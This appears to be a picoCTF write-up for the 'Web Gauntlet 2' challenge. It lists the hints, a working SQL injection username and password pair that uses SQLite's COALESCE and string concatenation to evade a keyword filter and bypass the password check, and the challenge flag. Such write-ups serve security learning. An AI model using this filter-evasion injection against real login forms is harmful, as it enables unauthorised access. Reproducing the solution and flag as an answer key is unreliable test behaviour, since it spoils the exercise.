# Web Gauntlet 2

## Description

This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:57359/ Filter: http://mercury.picoctf.net:57359/filter.php

## Hints

1. I tried to make it a little bit less contrived since the mini competition.
2. Each filter is separated by a space. Spaces are not filtered.
3. There is only 1 round this time, when you beat it the flag will be in filter.php.
4. There is a length component now.
5. sqlite

## Solution

Our winning payload was:

Username: `'||coalesce('admi'||'n',`
Password: `)||'`

This payload works by using the COALESCE() function in Sqlite3 to ignore the password portion of the SQL query.

## Flag

`picoCTF{0n3_m0r3_t1m3_d5a91d8c2ae4ce567c2e8b8453305565}`
